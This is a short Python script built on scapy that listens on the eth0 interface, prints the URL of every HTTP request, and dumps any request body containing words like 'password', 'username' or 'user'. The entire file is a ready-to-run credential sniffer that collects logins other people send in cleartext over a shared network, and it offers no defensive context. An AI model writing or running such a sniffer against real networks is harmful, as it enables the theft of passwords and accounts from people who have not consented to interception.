import scapy.all as scapy
from scapy.layers.http import HTTPRequest


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_packets)

def process_packets(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host + packet[HTTPRequest].Path
        print(url.decode('utf-8'))

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                if i in str(load):
                    print(load.decode('utf-8'))
                    break
words = ['Password','Username','password','username','pass','user','User']
sniff('eth0')










